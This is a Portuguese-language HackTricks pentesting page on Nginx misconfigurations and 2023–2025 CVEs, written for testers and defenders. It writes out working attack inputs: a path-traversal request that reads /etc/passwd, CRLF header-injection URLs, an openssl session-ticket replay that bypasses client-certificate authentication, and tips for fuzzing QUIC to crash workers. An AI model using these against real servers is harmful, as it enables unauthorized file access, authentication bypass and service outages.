# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Localização root ausente <a href="#missing-root-location" id="missing-root-location"></a>

Ao configurar o servidor Nginx, a **root directive** desempenha um papel crítico ao definir o diretório base a partir do qual os arquivos são servidos. Considere o exemplo abaixo:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Nesta configuração, `/etc/nginx` está designado como diretório root. Essa configuração permite o acesso a arquivos dentro do root especificado, como `/hello.txt`. No entanto, é importante notar que apenas uma location específica (`/hello.txt`) está definida. Não há configuração para a location root (`location / {...}`). Essa omissão significa que a diretiva root se aplica globalmente, permitindo que requisições ao caminho root `/` acessem arquivos sob `/etc/nginx`.

Surge uma consideração crítica de segurança com essa configuração. Uma simples requisição `GET`, como `GET /nginx.conf`, pode expor informações sensíveis ao servir o arquivo de configuração do Nginx localizado em `/etc/nginx/nginx.conf`. Definir o root para um diretório menos sensível, como `/etc`, pode mitigar esse risco, mas ainda assim pode permitir acesso não intencional a outros arquivos críticos, incluindo outros arquivos de configuração, logs de acesso, e até credenciais criptografadas usadas para HTTP basic authentication.

## Misconfiguração de Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nos arquivos de configuração do Nginx, é necessária uma inspeção cuidadosa das diretivas "location". Uma vulnerabilidade conhecida como Local File Inclusion (LFI) pode ser inadvertidamente introduzida por meio de uma configuração que se assemelha ao seguinte:
```
location /imgs {
alias /path/images/;
}
```
Esta configuração é suscetível a ataques LFI devido ao servidor interpretar requisições como `/imgs../flag.txt` como uma tentativa de acessar arquivos fora do diretório pretendido, efetivamente resolvendo para `/path/images/../flag.txt`. Essa falha permite que atacantes recuperem arquivos do sistema de arquivos do servidor que não deveriam ser acessíveis via web.

Para mitigar essa vulnerabilidade, a configuração deve ser ajustada para:
```
location /imgs/ {
alias /path/images/;
}
```
Mais informações: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Testes Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Restrição insegura de caminho <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Veja a página abaixo para aprender como contornar diretivas como:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Uso inseguro de variáveis / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Variáveis vulneráveis `$uri` e `$document_ur`i e isso pode ser corrigido substituindo-as por `$request_uri`.
>
> Uma regex também pode ser vulnerável, por exemplo:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerável
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Não vulnerável (verificando espaços)
>
> `location ~ /docs/(.*)? { … $1 … }` - Não vulnerável

Uma vulnerabilidade na configuração do Nginx é demonstrada pelo exemplo abaixo:
```
location / {
return 302 https://example.com$uri;
}
```
Os caracteres \r (Carriage Return) e \n (Line Feed) indicam caracteres de nova linha em requisições HTTP, e suas formas codificadas em URL são representadas como `%0d%0a`. Incluir esses caracteres em uma requisição (por exemplo, `http://localhost/%0d%0aDetectify:%20clrf`) em um servidor mal configurado faz com que o servidor emita um novo cabeçalho chamado `Detectify`. Isso ocorre porque a variável $uri decodifica os caracteres de nova linha codificados na URL, levando a um cabeçalho inesperado na resposta:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Saiba mais sobre os riscos de CRLF injection and response splitting em [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Also this technique is [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) with some vulnerable examples and dectection mechanisms. Por exemplo, para detectar essa má-configuração a partir de uma perspectiva blackbox, você pode usar estas requisições:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Se vulnerável, a primeira será aceita, já que "X" é qualquer método HTTP, e a segunda retornará um erro porque "H" não é um método válido. Assim o servidor receberá algo como: `GET / H HTTP/1.1` e isso irá disparar o erro.

Outros exemplos de detecção seriam:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Algumas configurações vulneráveis encontradas e apresentadas nessa palestra foram:

- Repare como **`$uri`** é definido tal como aparece na URL final
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Observe como **`$uri`** novamente aparece na URL (desta vez dentro de um parâmetro)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Agora em AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Qualquer variável

Foi descoberto que **dados fornecidos pelo usuário** podem ser tratados como uma **variável do Nginx** em certas circunstâncias. A causa desse comportamento permanece um tanto elusiva, porém não é rara nem simples de verificar. Essa anomalia foi destacada em um relatório de segurança no HackerOne, que pode ser visto [here](https://hackerone.com/reports/370094). Investigações adicionais da mensagem de erro levaram à identificação de sua ocorrência dentro do [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), apontando Server Side Includes (SSI) como a causa raiz.

Para **detectar essa misconfiguração**, o seguinte comando pode ser executado, o qual envolve definir um cabeçalho Referer para testar a impressão de variáveis:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Scans por essa má-configuração em sistemas revelaram múltiplas instâncias onde variáveis do Nginx podiam ser exibidas por um usuário. No entanto, uma diminuição no número de instâncias vulneráveis sugere que os esforços para corrigir esse problema foram relativamente bem-sucedidos.

### Usando try_files com variáveis $URI$ARGS

A seguinte má-configuração do Nginx pode levar a uma vulnerabilidade LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Na nossa configuração, temos a diretiva `try_files` que é usada para verificar a existência de arquivos em uma ordem especificada. O Nginx servirá o primeiro que encontrar. A sintaxe básica da diretiva `try_files` é a seguinte:
```
try_files file1 file2 ... fileN fallback;
```
O Nginx verificará a existência de cada arquivo na ordem especificada. Se um arquivo existir, ele será servido imediatamente. Se nenhum dos arquivos especificados existir, a requisição será passada para a opção de fallback, que pode ser outro URI ou uma página de erro específica.

No entanto, ao usar as variáveis `$uri$args` nessa diretiva, o Nginx tentará procurar um arquivo que corresponda ao URI da requisição combinado com quaisquer argumentos da query string. Portanto, podemos explorar essa configuração:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Com o seguinte payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Usando nosso payload, vamos escapar do diretório root (definido na configuração do Nginx) e carregar o arquivo `/etc/passwd`. Nos debug logs podemos observar como o Nginx tenta os arquivos:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC contra Nginx usando a configuração mencionada acima:
![Exemplo de requisição burp](../../images/nginx_try_files.png)

## Leitura de resposta bruta do backend

Nginx oferece um recurso via `proxy_pass` que permite a interceptação de erros e headers HTTP produzidos pelo backend, com o objetivo de ocultar mensagens de erro internas e headers. Isso é realizado pelo Nginx servindo páginas de erro customizadas em resposta a erros do backend. Entretanto, surgem problemas quando o Nginx encontra uma requisição HTTP inválida. Essa requisição é encaminhada ao backend exatamente como recebida, e a resposta bruta do backend é então enviada diretamente ao cliente sem a intervenção do Nginx.

Considere um cenário de exemplo envolvendo uma aplicação uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Para gerenciar isso, diretivas específicas na configuração do Nginx são usadas:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Esta diretiva permite que o Nginx sirva uma resposta personalizada para respostas do backend com um código de status maior que 300. Garante que, para o nosso exemplo de aplicação uWSGI, uma resposta `500 Error` seja interceptada e tratada pelo Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Como o nome sugere, esta diretiva oculta cabeçalhos HTTP especificados do cliente, aumentando a privacidade e a segurança.

Quando uma requisição válida `GET` é feita, o Nginx a processa normalmente, retornando uma resposta de erro padrão sem revelar quaisquer cabeçalhos secretos. No entanto, uma requisição HTTP inválida contorna esse mecanismo, resultando na exposição de respostas brutas do backend, incluindo cabeçalhos secretos e mensagens de erro.

## merge_slashes definido como off

Por padrão, a diretiva **`merge_slashes`** do Nginx está definida como **`on`**, o que comprime múltiplas barras em uma URL em uma única barra. Esse recurso, apesar de simplificar o processamento de URLs, pode inadvertidamente ocultar vulnerabilidades em aplicações atrás do Nginx, particularmente aquelas suscetíveis a local file inclusion (LFI). Os especialistas em segurança **Danny Robinson and Rotem Bar** destacaram os riscos potenciais associados a esse comportamento padrão, especialmente quando o Nginx atua como reverse-proxy.

Para mitigar esses riscos, recomenda-se **desativar a diretiva `merge_slashes`** para aplicações suscetíveis a essas vulnerabilidades. Isso garante que o Nginx encaminhe as requisições para a aplicação sem alterar a estrutura da URL, evitando assim mascarar problemas de segurança subjacentes.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), there are certain headers that if present in the response from the web server they will change the behaviour of the Nginx proxy. You can check them [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Indica ao Nginx realizar um redirecionamento interno de uma requisição para um local especificado.
- `X-Accel-Buffering`: Controla se o Nginx deve bufferizar a resposta ou não.
- `X-Accel-Charset`: Define o conjunto de caracteres para a resposta ao usar X-Accel-Redirect.
- `X-Accel-Expires`: Define o tempo de expiração da resposta ao usar X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Limita a taxa de transferência para respostas ao usar X-Accel-Redirect.

For example, the header **`X-Accel-Redirect`** will cause an internal **redirect** in the nginx. So having an nginx configuration with something such as **`root /`** and a response from the web server with **`X-Accel-Redirect: .env`** will make nginx sends the content of **`/.env`** (Path Traversal).

### **Valor Padrão na Diretiva map**

Na **configuração do Nginx**, a diretiva `map` frequentemente desempenha um papel no **controle de autorização**. Um erro comum é não especificar um valor **default**, o que pode levar a acesso não autorizado. Por exemplo:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Sem um `default`, um **malicious user** pode contornar a segurança ao acessar um **undefined URI** dentro de `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) aconselha definir um **default value** para evitar esse tipo de problema.

### **DNS Spoofing Vulnerability**

DNS spoofing contra o Nginx é viável sob certas condições. Se um attacker conhece o **DNS server** usado pelo Nginx e consegue interceptar suas DNS queries, ele pode spoofar DNS records. Esse método, porém, é ineficaz se o Nginx estiver configurado para usar **localhost (127.0.0.1)** para resolução de DNS. Nginx permite especificar um DNS server da seguinte forma:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` and `internal` Diretivas**

A diretiva **`proxy_pass`** é utilizada para redirecionar requisições para outros servidores, seja interna ou externamente. A diretiva **`internal`** garante que certas localizações sejam acessíveis apenas dentro do Nginx. Embora essas diretivas não sejam vulnerabilidades por si só, sua configuração requer exame cuidadoso para evitar falhas de segurança.

## proxy_set_header Upgrade & Connection

Se o servidor nginx estiver configurado para repassar os headers Upgrade e Connection, um [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) poderia ser realizado para acessar endpoints protegidos/internos.

> [!CAUTION]
> Essa vulnerabilidade permitiria que um atacante **estabelecesse uma conexão direta com o endpoint `proxy_pass`** (`http://backend:9999` neste caso) cujo conteúdo não será inspecionado pelo nginx.

Exemplo de configuração vulnerável para roubar `/flag` de [aqui](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Note que mesmo se o `proxy_pass` estivesse apontando para um **caminho** específico, como `http://backend:9999/socket.io`, a conexão será estabelecida com `http://backend:9999`, então você pode **contatar qualquer outro caminho dentro desse endpoint interno. Portanto, não importa se um caminho é especificado na URL do proxy_pass.**

## Módulo HTTP/3 QUIC — DoS remoto & leak (2024)

Durante 2024 a Nginx divulgou CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 e CVE-2024-35200 mostrando que uma única sessão QUIC hostil pode crashar worker processes ou causar leak de memória sempre que o módulo experimental `ngx_http_v3_module` estiver compilado e um socket `listen ... quic` estiver exposto. As builds impactadas são 1.25.0–1.25.5 e 1.26.0, enquanto 1.27.0/1.26.1 trazem as correções; a divulgação de memória (CVE-2024-34161) adicionalmente requer MTUs maiores que 4096 bytes para expor dados sensíveis (detalhes no advisory do nginx de 2024 referenciado abaixo).

**Recon & exploitation hints**

- HTTP/3 é opt-in, então scan por respostas `Alt-Svc: h3=":443"` ou brute-force handshakes QUIC em UDP/443; uma vez confirmado, fuzz o handshake e STREAM frames com payloads customizados do `quiche-client`/`nghttp3` para provocar worker crashes e forçar log leakage.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Bypass de retomada de sessão TLS da autenticação por certificado do cliente (CVE-2025-23419)

Um comunicado de fevereiro de 2025 divulgou que o nginx 1.11.4–1.27.3 compilado com OpenSSL permite **reutilizar uma sessão TLS 1.3** de um name-based virtual host dentro de outro, de modo que um cliente que negociou um host sem certificado pode reproduzir o ticket/PSK para saltar para um vhost protegido com `ssl_verify_client on;` e pular o mTLS completamente. O bug é acionado sempre que múltiplos virtual hosts compartilham o mesmo cache de sessão TLS 1.3 e tickets (veja o advisory do nginx de 2025 referenciado abaixo).

**Playbook do atacante**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Se o alvo for vulnerável, o segundo handshake é concluído sem apresentar um certificado de cliente, revelando locais protegidos.

**O que auditar**

- Blocos `server_name` mistos que compartilham `ssl_session_cache shared:SSL` mais `ssl_session_tickets on;`.
- Blocos Admin/API que esperam mTLS mas herdam configurações compartilhadas de cache/ticket de sessão de hosts públicos.
- Automação que habilita TLS 1.3 session resumption globalmente (e.g., Ansible roles) sem considerar isolamento de vhost.

## Resiliência ao HTTP/2 Rapid Reset (CVE-2023-44487 behavior)

The HTTP/2 Rapid Reset attack (CVE-2023-44487) ainda afeta nginx quando operadores aumentam `keepalive_requests` ou `http2_max_concurrent_streams` além dos valores padrão: um atacante abre uma conexão HTTP/2, a inunda com milhares de streams e em seguida envia instantaneamente frames `RST_STREAM` para que o teto de concorrência nunca seja atingido, enquanto a CPU continua consumida pela lógica de encerramento. Os padrões do nginx (128 concurrent streams, 1000 keepalive requests) mantêm o raio de impacto pequeno; elevar esses limites "substancialmente mais" torna trivial esgotar workers mesmo a partir de um único cliente (veja o F5 write-up referenciado abaixo).

**Dicas de detecção**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts que revelam valores incomumente altos para essas diretivas são alvos principais: um cliente HTTP/2 pode iterar pela criação de streams e enviar instantaneamente frames `RST_STREAM` para manter a CPU no limite sem acionar o cap de concorrência.

## Experimente você mesmo

Detectify criou um repositório no GitHub onde você pode usar Docker para configurar seu próprio servidor de teste Nginx vulnerável com algumas das misconfigurações discutidas neste artigo e tentar encontrá-las você mesmo!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Ferramentas de Static Analyzer

### [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)

GixyNG (um fork atualizado do GIXY) é uma ferramenta para analisar configurações Nginx, com o objetivo de encontrar vulnerabilidades, diretivas inseguras e misconfigurações arriscadas. Também identifica misconfigurações que afetam o desempenho e detecta oportunidades de hardening perdidas, permitindo a detecção automatizada de falhas.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner é uma ferramenta simples para procurar misconfigurações comuns do Nginx e vulnerabilidades.

## Referências

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
